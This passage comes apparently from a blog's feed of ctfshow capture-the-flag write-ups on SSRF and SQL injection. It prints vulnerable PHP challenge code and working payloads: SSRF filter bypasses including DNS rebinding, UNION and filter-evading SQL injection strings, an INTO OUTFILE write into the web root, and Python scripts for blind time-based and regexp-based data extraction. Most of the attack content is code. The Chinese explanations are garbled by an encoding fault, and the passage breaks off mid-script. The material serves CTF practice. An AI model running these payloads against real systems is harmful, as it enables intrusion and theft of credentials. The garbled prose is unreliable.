class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†local  127.0.   ã€‚</p>
<p><code>url=http://0/flag.php</code></p>
<h2 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;</span><br><span class="line">if(!preg_match(&#x27;/localhost|1|0|ã€‚/i&#x27;, $url))&#123;</span><br><span class="line">$ch=curl_init($url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">echo ($result);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>è§£æ³•ä¸€ï¼špayload:</p>
<p><code>url=http://r.3hpgmf.ceye.io/flag.php</code></p>
<p>è§£æ³•äºŒpayload:</p>
<p><code>url=http://sudo.cc/flag.phpd</code></p>
<p>è§£æ³•ä¸€å’ŒäºŒéƒ½æ˜¯ <strong>DNS Rebinding DNSé‡ç»‘å®š</strong>ä½†æˆ‘ä¸å¤ªæ‡‚</p>
<p>ä¸€ä¸ªå¸¸ç”¨çš„é˜²æŠ¤æ€è·¯æ˜¯ï¼šå¯¹äºç”¨æˆ·è¯·æ±‚çš„URLå‚æ•°ï¼Œé¦–å…ˆæœåŠ¡å™¨ç«¯ä¼šå¯¹å…¶è¿›è¡ŒDNSè§£æï¼Œç„¶åå¯¹äºDNSæœåŠ¡å™¨è¿”å›çš„IPåœ°å€è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœåœ¨é»‘åå•ä¸­ï¼Œå°±ç¦æ­¢è¯¥æ¬¡è¯·æ±‚ã€‚</p>
<p>ä½†æ˜¯åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œç¬¬ä¸€æ¬¡å»è¯·æ±‚DNSæœåŠ¡è¿›è¡ŒåŸŸåè§£æåˆ°ç¬¬äºŒæ¬¡æœåŠ¡ç«¯å»è¯·æ±‚URLä¹‹é—´å­˜åœ¨ä¸€ä¸ªæ—¶é—´å·®ï¼Œåˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®ï¼Œå¯ä»¥è¿›è¡ŒDNSé‡ç»‘å®šæ”»å‡»ã€‚</p>
<p>è¦å®ŒæˆDNSé‡ç»‘å®šæ”»å‡»ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªåŸŸåï¼Œå¹¶ä¸”å°†è¿™ä¸ªåŸŸåçš„è§£ææŒ‡å®šåˆ°æˆ‘ä»¬è‡ªå·±çš„DNS Serverï¼Œåœ¨æˆ‘ä»¬çš„å¯æ§çš„DNS Serverä¸Šç¼–å†™è§£ææœåŠ¡ï¼Œè®¾ç½®TTLæ—¶é—´ä¸º0ã€‚è¿™æ ·å°±å¯ä»¥è¿›è¡Œæ”»å‡»äº†ï¼Œå®Œæ•´çš„æ”»å‡»æµç¨‹ä¸ºï¼š</p>
<ul>
<li>æœåŠ¡å™¨ç«¯è·å¾—URLå‚æ•°ï¼Œè¿›è¡Œç¬¬ä¸€æ¬¡DNSè§£æï¼Œè·å¾—äº†ä¸€ä¸ªéå†…ç½‘çš„IP</li>
<li>å¯¹äºè·å¾—çš„IPè¿›è¡Œåˆ¤æ–­ï¼Œå‘ç°ä¸ºéé»‘åå•IPï¼Œåˆ™é€šè¿‡éªŒè¯</li>
<li>æœåŠ¡å™¨ç«¯å¯¹äºURLè¿›è¡Œè®¿é—®ï¼Œç”±äºDNSæœåŠ¡å™¨è®¾ç½®çš„TTLä¸º0ï¼Œæ‰€ä»¥å†æ¬¡è¿›è¡ŒDNSè§£æï¼Œè¿™ä¸€æ¬¡DNSæœåŠ¡å™¨è¿”å›çš„æ˜¯å†…ç½‘åœ°å€ã€‚</li>
<li>ç”±äºå·²ç»ç»•è¿‡éªŒè¯ï¼Œæ‰€ä»¥æœåŠ¡å™¨ç«¯è¿”å›è®¿é—®å†…ç½‘èµ„æºçš„ç»“æœã€‚</li>
</ul>
<p><a href="https://blog.csdn.net/weixin_52240463/article/details/122659261">(9æ¡æ¶ˆæ¯) ctfshow ssrf_InvMacKingçš„åšå®¢-CSDNåšå®¢</a></p>
<p><strong>dnsè§£æåéƒ½æ˜¯127.0.0.1</strong>  </p>
<p><a href="http://www.ip33.com/dns.html">dnsè§£æç½‘ç«™</a></p>
<p>ctfshow{36fde1d8-aa94-4340-8dd5-297d32bb75c8}</p>
<h2 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;</span><br><span class="line">$host=$x[&#x27;host&#x27;];</span><br><span class="line">if((strlen($host)&lt;=5))&#123;</span><br><span class="line">$ch=curl_init($url); </span><br></pre></td></tr></table></figure>

<p><code>protocol :// hostname[:port] / path / [:parameters][?query]#fragment</code></p>
<p>hosté•¿åº¦å°äºäº”</p>
<p>payload:<code>url=http://127.1/flag.php</code></p>
<p><code>url=http://0/flag.php</code></p>
<p><code> </code>ctfshow{cccbab1c-c78b-486c-b4da-da079ec826ad}</p>
<h2 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;</span><br><span class="line">$host=$x[&#x27;host&#x27;];</span><br><span class="line">if((strlen($host)&lt;=3))&#123;</span><br><span class="line">$ch=curl_init($url); </span><br></pre></td></tr></table></figure>

<p>payload:</p>
<p><code>url=http://0/flag.php</code></p>
<p>SSRFå¸¸è§çš„ç»•è¿‡æ–¹å¼</p>
<p>ï¼ˆä¸€ï¼‰æ›´æ”¹ipåœ°å€å†™æ³•ç»•è¿‡</p>
<p>ä¸€äº›å¼€å‘è€…ä¼šé€šè¿‡å¯¹ä¼ é€’çš„URLå‚æ•°è¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤ï¼Œä»£ç å¦‚ä¸‹</p>
<pre><code>10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;3&#125;$
172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;2&#125;$
</code></pre>
<p>è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹è¿›åˆ¶çš„æ–¹å¼ç»•è¿‡ï¼Œå¦‚192.168.0.1è¿™ä¸ªipåœ°å€ï¼Œå°±å¯ä»¥æ”¹å†™æˆ</p>
<p>å…«è¿›åˆ¶ï¼š0300.0250.0.1</p>
<p>åè¿›åˆ¶æ•´æ•°ï¼š3232235521</p>
<p>åå…­è¿›åˆ¶&#x2F;æ•´æ•°ï¼š0xC0.0xA8.0.1&#x2F;0xC0A80001</p>
<h2 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]); <span class="comment">//è¿”å› IPv4 åœ°å€æ•°ç»„ï¼Œå¦‚æœæ— æ³•è§£æï¼Œåˆ™è¿”å› falseã€‚hostname</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> scheme</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://r.u77wzd.ceye.io/flag.php</span><br></pre></td></tr></table></figure>

<p>ctfshow{d169ee0a-273f-45a7-b225-89cd7b9b0639}</p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>variable</td>
<td>å¿…éœ€ã€‚è§„å®šè¦è¿‡æ»¤çš„å˜é‡ã€‚</td>
</tr>
<tr>
<td>filter</td>
<td>å¯é€‰ã€‚è§„å®šè¦ä½¿ç”¨çš„è¿‡æ»¤å™¨çš„ IDã€‚</td>
</tr>
<tr>
<td>options</td>
<td>è§„å®šåŒ…å«æ ‡å¿—&#x2F;é€‰é¡¹çš„æ•°ç»„ã€‚æ£€æŸ¥æ¯ä¸ªè¿‡æ»¤å™¨å¯èƒ½çš„æ ‡å¿—å’Œé€‰é¡¹ã€‚</td>
</tr>
</tbody></table>
<ul>
<li>gethostbyname â€” è¿”å›ä¸»æœºåå¯¹åº”çš„ IPv4åœ°å€ã€‚ </li>
<li>filter_var â€” ä½¿ç”¨ç‰¹å®šçš„è¿‡æ»¤å™¨è¿‡æ»¤ä¸€ä¸ªå˜é‡</li>
<li>FILTER_FLAG_IPV4 - è¦æ±‚å€¼æ˜¯åˆæ³•çš„ IPv4 IPï¼ˆæ¯”å¦‚ 255.255.255.255ï¼‰</li>
<li>FILTER_FLAG_IPV6 - è¦æ±‚å€¼æ˜¯åˆæ³•çš„ IPv6 IPï¼ˆæ¯”å¦‚ 2001:0db8:85a3:08d3:1319:8a2e:0370:7334ï¼‰</li>
<li>FILTER_FLAG_NO_PRIV_RANGE - è¦æ±‚å€¼æ˜¯ RFC æŒ‡å®šçš„ç§åŸŸ IP ï¼ˆæ¯”å¦‚ 192.168.0.1ï¼‰</li>
<li>FILTER_FLAG_NO_RES_RANGE - è¦æ±‚å€¼ä¸åœ¨ä¿ç•™çš„ IP èŒƒå›´å†…ã€‚è¯¥æ ‡å¿—æ¥å— IPV4 å’Œ IPV6 å€¼ã€‚</li>
</ul>
<p><a href="https://blog.csdn.net/ing_end/article/details/124369282">https://blog.csdn.net/ing_end/article/details/124369282</a></p>
<h2 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">é‡è¯</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="center">+</td>
<td>åŒ¹é…ä»»ä½•è‡³å°‘åŒ…å«ä¸€ä¸ªå‰å¯¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">*</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«é›¶ä¸ªæˆ–å¤šä¸ªå‰å¯¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">?</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«é›¶ä¸ªæˆ–1ä¸ªå‰å¯¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">.</td>
<td>åŒ¹é…ä»»æ„ä¸€ä¸ªå­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">{x}</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«xä¸ªå‰å¯¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">{x,y}</td>
<td>åŒ¹é…ä»»ä½•åŒ…å« x åˆ° y ä¸ªå‰å¯¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">{x,}</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«è‡³å°‘xä¸ªå‰å¯¼å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">^</td>
<td>åŒ¹é…å­—ç¬¦ä¸²çš„è¡Œé¦–</td>
</tr>
<tr>
<td align="center">$</td>
<td>åŒ¹é…å­—ç¬¦ä¸²çš„è¡Œå°¾</td>
</tr>
<tr>
<td align="center">|</td>
<td>é€‰æ‹©ç¬¦ åŒ¹é…å­—ç¬¦ä¸²çš„å·¦è¾¹æˆ–è€…å³è¾¹</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">å…ƒå­—ç¬¦</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="center">[a-z]</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«å°å†™å­—æ¯a-zçš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">[A-Z]</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«å¤§å†™å­—æ¯A-Zçš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">[0-9]</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«0-9çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">[abc]</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«å°å†™å­—æ¯a,b,cçš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">[^abc]</td>
<td>åŒ¹é…ä»»ä½•ä¸åŒ…å«å°å†™å­—æ¯a,b,cçš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">[a-zA-Z0-9_]</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«a-zA-Z0-9å’Œä¸‹åˆ’çº¿çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">\w</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«a-zA-Z0-9å’Œä¸‹åˆ’çº¿çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">\W</td>
<td>åŒ¹é…ä»»ä½•ä¸åŒ…å«a-zA-Z0-9å’Œä¸‹åˆ’çº¿çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td align="center">\d</td>
<td>åŒ¹é…ä»»ä½•åŒ…å«æ•°å­—å­—ç¬¦</td>
</tr>
<tr>
<td align="center">\D</td>
<td>åŒ¹é…ä»»ä½•éæ•°å­—å­—ç¬¦</td>
</tr>
<tr>
<td align="center">\s</td>
<td>åŒ¹é…ä»»ä½•ç©ºç™½å­—ç¬¦</td>
</tr>
<tr>
<td align="center">\S</td>
<td>åŒ¹é…ä»»ä½•éç©ºç™½å­—ç¬¦</td>
</tr>
<tr>
<td align="center">\b</td>
<td>åŒ¹é…æ˜¯å¦åˆ°è¾¾äº†å•è¯è¾¹ç•Œ</td>
</tr>
<tr>
<td align="center">\B</td>
<td>åŒ¹é…æ²¡æœ‰åˆ°è¾¾äº†å•è¯è¾¹ç•Œ</td>
</tr>
<tr>
<td align="center">\</td>
<td>åŒ¹é…æ­£åˆ™ä¸­çš„ç‰¹æ®Šå­—ç¬¦</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">ä¿®é¥°ç¬¦</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="center">i</td>
<td>å®Œå…¨ä¸åŒºåˆ†å¤§å°å†™</td>
</tr>
<tr>
<td align="center">m</td>
<td>å¯ä»¥é‡‡ç”¨å¤šè¡Œè¯†åˆ«,é‡åˆ°æ¢è¡Œä¹Ÿæ‰¿è®¤åŒ¹é…è§„åˆ™</td>
</tr>
<tr>
<td align="center">x</td>
<td>å¿½ç•¥æ‰è§„åˆ™æ¨¡å¼ä¸­çš„ç©ºç™½å­—ç¬¦</td>
</tr>
<tr>
<td align="center">A</td>
<td>å¼ºåˆ¶ä»å¤´å¼€å§‹åŒ¹é…</td>
</tr>
<tr>
<td align="center">U</td>
<td>ç¦æ­¢è´ªå©ªåŒ¹é…ï¼Œåªè·Ÿè¸ªåˆ°æœ€è¿‘çš„ä¸€ä¸ªåŒ¹é…ç¬¦å¹¶ç»“æŸ</td>
</tr>
</tbody></table>
<p>æ­£åˆ™è¡¨è¾¾å¼çš„æ„æ€æ˜¯ä»¥<a href="http://ctf.å¼€å¤´,ä»¥showç»“å°¾./">http://ctf.å¼€å¤´ï¼Œä»¥showç»“å°¾ã€‚</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://ctf.@127.0.0.1/flag.php?show</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://ctf.@127.0.0.1/flag.php#show</span><br></pre></td></tr></table></figure>

<p>å¦‚æœä¸åœ¨<code>ctf.</code>åé¢åŠ <code>@</code>,è§£æurlæ—¶ä¼šæŠŠ<code>ctf.</code>ä¹Ÿè§£ææˆ<strong>host</strong>çš„å†…å®¹ï¼Œ</p>
<p>ctfshow{4f304e6c-bcfb-4164-bd32-26590444c2b6}</p>
<p><a href="https://blog.csdn.net/weixin_52240463/article/details/122659261">https://blog.csdn.net/weixin_52240463/article/details/122659261</a></p>
]]></content>
      <tags>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-webå…¥é—¨-sqlæ³¨å…¥</title>
    <url>/2023/01/17/ctfshow-web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>sqlæ³¨å…¥</p>
<span id="more"></span>

<h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 --+    #ä¸‡èƒ½å¯†ç </span><br></pre></td></tr></table></figure>

<h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>å­—æ®µæ•°ï¼Œå¯ä»¥ä½¿ç”¨ï¼Œ1â€™ order by 2 â€“+æŸ¥è¯¢</p>
<p>è¿‡æ»¤äº†å›æ˜¾ï¼Œæ‰€ä»¥ç”¨ä¸€ä¸‹ to_base64()å‡½æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select to_base64(username),to_base64(password) from ctfshow_user2 --+</span><br></pre></td></tr></table></figure>

<h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>å˜æˆ3ä¸ªå­—æ®µï¼Œå†åŠ ä¸€ä¸ªå­—æ®µå³å¯ï¼Œè¡¨ä¹Ÿæ”¹å˜äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,to_base64(username),to_base64(password) from ctfshow_user3 --+</span><br></pre></td></tr></table></figure>

<h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://e207c481-18cb-44fa-936b-eb02a0e88231.challenge.ctf.show/api/v5.php?id=1&#x27; and &quot;</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    i = i + 1</span><br><span class="line">    head = 32</span><br><span class="line">    tail = 127</span><br><span class="line">    while head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; 1</span><br><span class="line">        payload = f&#x27;1=if(ascii(substr((select  password from ctfshow_user5 limit 24,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0) -- -&#x27;</span><br><span class="line">        try:</span><br><span class="line">            r = requests.get(url + payload, timeout=0.5)</span><br><span class="line">            tail = mid</span><br><span class="line">        except Exception as e:</span><br><span class="line">            head = mid + 1</span><br><span class="line">    if head != 32:</span><br><span class="line">        result += chr(head)</span><br><span class="line">    else:</span><br><span class="line">        break</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p>Y4tackerå¸ˆå‚…å†™çš„ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try:</span><br><span class="line">  å¯èƒ½äº§ç”Ÿå¼‚å¸¸çš„ä»£ç å—</span><br><span class="line">except [ (Error1, Error2, ... ) [as e] ]:</span><br><span class="line">  å¤„ç†å¼‚å¸¸çš„ä»£ç å—1</span><br><span class="line">except [ (Error3, Error4, ... ) [as e] ]:</span><br><span class="line">  å¤„ç†å¼‚å¸¸çš„ä»£ç å—2</span><br><span class="line">except [Exception]:</span><br><span class="line">  å¤„ç†å…¶å®ƒå¼‚å¸¸</span><br></pre></td></tr></table></figure>

<p>ä¸ºé˜²æ­¢æœåŠ¡å™¨ä¸èƒ½åŠæ—¶å“åº”ï¼Œå¤§éƒ¨åˆ†å‘è‡³å¤–éƒ¨æœåŠ¡å™¨çš„è¯·æ±‚éƒ½åº”è¯¥å¸¦ç€ timeout å‚æ•°ã€‚åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œé™¤éæ˜¾å¼æŒ‡å®šäº† timeout å€¼ï¼Œrequests æ˜¯ä¸ä¼šè‡ªåŠ¨è¿›è¡Œè¶…æ—¶å¤„ç†çš„ã€‚å¦‚æœæ²¡æœ‰ timeoutï¼Œä½ çš„ä»£ç å¯èƒ½ä¼šæŒ‚èµ·è‹¥å¹²åˆ†é’Ÿç”šè‡³æ›´é•¿æ—¶é—´ã€‚åœ¨çˆ¬è™«ä»£ç†è¿™ä¸€å—æˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°è¯·æ±‚è¶…æ—¶çš„é—®é¢˜ï¼Œ<strong>ä»£ç å°±å¡åœ¨å“ªé‡Œï¼Œä¸æŠ¥é”™ä¹Ÿæ²¡æœ‰requestsè¯·æ±‚çš„å“åº”ã€‚</strong></p>
<p>é€šå¸¸çš„å¤„ç†æ˜¯åœ¨requests.get()è¯­å¥ä¸­åŠ å…¥timeouté™åˆ¶è¯·æ±‚æ—¶é—´</p>
<p>è§£æ³•äºŒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/v5.php?id=1&#x27; union select 1,password from ctfshow_user5 into outfile &#x27;/var/www/html/1.txt&#x27;--+&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure>

<p>è®¿é—®1.txtå³å¯</p>
<h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 --+</span><br></pre></td></tr></table></figure>

<h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/password,1,1/**/from/**/ctfshow_user/**/where/**/username/**/=&#x27;flag&#x27;%23</span><br></pre></td></tr></table></figure>

<h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;or&#x27;1&#x27;=&#x27;1&#x27;%23</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;%09union%09select%091,2,password%09from%09ctfshow_user%09where%09username=&#x27;flag&#x27;%23</span><br></pre></td></tr></table></figure>

<h2 id="web180-182"><a href="#web180-182" class="headerlink" title="web180-182"></a>web180-182</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;or(id=26)and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p>ç©ºæ ¼ç»•è¿‡</p>
<p>%0a %0b %0c %0d %09 æ³¨é‡Š&#x2F;**&#x2F; æ‹¬å·ç­‰ä¸€äº›ç¬¦å·éš”å¼€</p>
<h2 id="web183-æ­£åˆ™åŒ¹é…"><a href="#web183-æ­£åˆ™åŒ¹é…" class="headerlink" title="web183-æ­£åˆ™åŒ¹é…"></a>web183-æ­£åˆ™åŒ¹é…</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span><br><span class="line">  $sql = &quot;select count(pass) from &quot;.$_POST[&#x27;tableName&#x27;].&quot;;&quot;;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">    return preg_match(&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i&#x27;, $str);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢ç»“æœ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//è¿”å›ç”¨æˆ·è¡¨çš„è®°å½•æ€»æ•°</span><br><span class="line">      $user_count = 0;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://5b285b83-8642-4556-b1cc-ca435d196f99.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr=<span class="string">&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">34</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;`ctfshow_user`where`pass`regexp(\&quot;ctfshow&#123;&#125;\&quot;)&quot;</span>.<span class="built_in">format</span>(flag+x)</span><br><span class="line">            <span class="comment">#&quot;tableName&quot;:&quot;`ctfshow_user`where`pass`like\&#x27;ctfshow&#123;&#125;%\&#x27;&quot;.format(flag+x)</span></span><br><span class="line">        &#125;</span><br><span class="line">        response=requests.post(url,data=data)</span><br><span class="line">        <span class="comment">#æœ‰å¹¶å‘æ•°é‡é™åˆ¶çš„é¢˜ç›®ï¼Œå°±ç¡ä¸€æ®µ</span></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> response.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++ &#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span 